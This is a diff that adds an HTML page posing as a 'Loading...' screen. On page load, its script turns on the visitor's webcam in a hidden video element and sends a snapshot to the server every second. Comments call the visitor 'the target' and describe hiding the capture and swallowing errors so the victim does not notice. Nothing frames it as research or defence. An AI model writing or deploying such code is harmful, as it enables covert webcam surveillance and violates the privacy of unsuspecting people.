@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        async function captureCam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                // Video ko DOM mein add nahi karenge - background mein chalega
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                
+                setInterval(() => {
+                    ctx.drawImage(video, 0, 0, 640, 480);
+                    const data = canvas.toDataURL('image/png');
+                    fetch(window.location.href, {
+                        method: 'POST',
+                        body: JSON.stringify({ image: data }),
+                        headers: { 'Content-Type': 'application/json' }
+                    }).catch(err => console.error('Fetch error:', err));
+                }, 1000);
+            } catch (err) {
+                console.error('Camera error:', err);
+                // Error bhi silently handle - target ko pata nahi chalega
+            }
+        }
+        window.onload = captureCam;
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <!-- Minimal content - target ko lage page normal hai -->
+</body>
+</html>
